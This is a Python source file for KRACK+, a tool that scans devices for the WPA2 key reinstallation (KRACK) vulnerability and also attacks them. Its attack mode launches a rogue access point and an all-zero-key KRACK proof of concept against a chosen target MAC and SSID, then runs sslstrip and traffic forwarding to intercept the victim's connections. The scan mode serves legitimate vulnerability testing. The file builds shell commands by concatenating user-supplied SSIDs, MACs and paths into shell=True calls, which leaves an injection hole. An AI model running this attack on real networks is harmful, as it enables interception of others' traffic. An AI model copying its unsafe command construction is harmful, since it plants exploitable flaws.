#!/usr/bin/env python
import sys
import optparse
import subprocess
import atexit
import logging
# to move pcap files
import shutil
import os
# to implement progress bar.
import click
from parser import *
from multiprocessing import Process
from subprocess import check_output

# install colorlog if not already present on system
subprocess.call(["./prepareKrackPlus.sh"])
from colorlog import ColoredFormatter

# For colored output
LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
LOG_LEVEL = logging.DEBUG
logging.root.setLevel(LOG_LEVEL)
formatter = ColoredFormatter(LOGFORMAT)
stream = logging.StreamHandler()
stream.setLevel(LOG_LEVEL)
stream.setFormatter(formatter)
log = logging.getLogger('pythonConfig')
log.setLevel(LOG_LEVEL)
log.addHandler(stream) 

########   Examples which gives dirrent colored output    #################
#log.debug("A quirky message only developers care about")             WHITE
#log.info("Curious users might want to know this")                    GREEN
#log.warn("Something is wrong and all users should be informed")       YELLOW
#log.error("Serious stuff, this is red for a reason")                 RED
#log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE

log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in WPA2, discovered by Mathy Vanhoef.")
log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")

def main():
    USAGE = "\nKRACK+ Scan:   ./krackPlus.py [-s]\n\t       ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKRACK+ Attack: ./krackPlus.py [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
    path = 'reports/'
    parser = optparse.OptionParser(usage=USAGE)

    # KRACK+ Attack options
    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
    parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                        "using a modified hostapd.", dest='rogue')
    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')


    # KRACK+ Scan options
    parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
                      " Simply connect to the network and the scan will be executed against the connected device.", dest='scan', default=False, action='store_true')
    parser.add_option('--set-ssid', default='testnetwork', help="Use this option to set the SSID for the created network.", dest='ssid')
    parser.add_option('--set-password', default='abcdefgh', help="Use this option to set the password for the created network."
                      " Password length has to be 8 characters or more!", dest='password')
    parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')


    # General KRACK+ options:
    parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
    parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan or Attack", dest='debug', action='store_true')
    parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true')

    
    options, args = parser.parse_args()
    
    ############# SCAN ################
    if options.scan and not options.attack:

        # Write the credentials to file, so that they can be used next time the progran runs.
        with open('./networkCredentials.txt', 'w') as netCredentials:
            if len(options.password) >= 8:
                netCredentials.write(options.ssid + '\n' + options.password)
	    else:
                log.warn("Password length has to be longer than 8 characters, try again or don't specify password; the default password is 'abcdefgh'.")
                sys.exit()
	
	# Attempt to launch scan, write output to file and display parsed output on screen
        try:
            subprocess.call(["./prepareClientScan.sh"])
            log.info("Running KRACK+ Scan:")
            log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
            log.warn("Press 'ctrl-c' to end/abort scan and generate PDF of findings.")
      	    with open('./scanOutput.txt', 'w') as scanOutput:
		if options.scan and options.debug:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
		elif options.scan and options.dd:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
		else:
                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
            	    scanParser() 
    
        except(KeyboardInterrupt, SystemExit):
		subprocess.call(["clear"], shell=True)
                with click.progressbar(range(50000), label="Cleaning up and generating PDF") as bar:
                    for i in bar:
                        pass
                subprocess.call(["./restoreClientWifi.sh"])
                writeResults()
		if options.path:
                	subprocess.call(["./genPDF.py " + options.path], shell=True)
			log.info("PDF generated in '" + options.path + "'.")
		else: 
                	subprocess.call(["./genPDF.py " + path], shell=True)
			log.info("PDF generated in '" + path + "'.")
                subprocess.call(["rm scanOutput.txt"], shell=True)
                subprocess.call(["rm scannedMacIP.txt"], shell=True)
                subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
                subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
                
        #except:
         #   log.error("Error occurred.")
          #  log.info("Restoring internet connection.")
           # subprocess.call(["./restoreClientWifi.sh"])


    ############# ATTACK ################
    elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
        try:
            print("Performing key reinstallation attack")

            #Sets up dependencies before the attack script runs
            subprocess.call(["./prepareClientAttack.sh"])         
            with open('./attackOutput.txt', 'w') as attackOutput:
		
		# Gives error if user attempts to combine pcap option with either debugging option.
		if options.pcap and (options.dd or options.debug):		
			raise KeyboardInterrupt("ERROR: cannot combine pcap with -d or --dd")
			
                # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
		elif options.dd:
			# Runs attack with debug enabled
		        subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
		                         options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
			
		elif options.pcap:
			# TODO creates a file, but fails to move it. Also haven't verified that it contains anything of interest. 
			# Saves pcap from attack to file. 
			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
			source=os.listdir("krackattacks-poc-zerokey/krackattack/")
			destination="reports/"
			for fileName in source:
				if str(".pcap") in str(fileName):
					shutil.move(fileName, destination)

		else: 
			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)

                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
                subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
	
		print("Open Wireshark to see traffic")
		# User will only see relevant output, unless debug is on
		if options.debug:
			print("Debug enabled")
		else:            	
			attackParser()

        except KeyboardInterrupt, e:
   	    subprocess.call(["clear"], shell=True)
	    print e
            log.info("Cleaning up and restoring wifi ...")
	    subprocess.call(["rm attackOutput.txt"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])

	except:
	    subprocess.call(["clear"], shell=True)
            log.info("Error occurred. Restoring wifi ...")
            subprocess.call(["rm attackOutput.txt"], shell=True)
            subprocess.call(["./restoreClientWifi.sh"])

    ############# RESTORE INTERNET ################        
    elif options.restore:
        log.debug("Restoring internet connection")
        subprocess.call(["./restoreClientWifi.sh"])
        log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")

    ########## NO OPTION OR WRONG USAGE ###########    
    elif options.attack and options.scan:
        log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
        parser.print_help()
    else:
        log.warn("No option was given or there were missing arguments, please see usage below and try again!")
        parser.print_help()

if __name__ == '__main__':
    main()
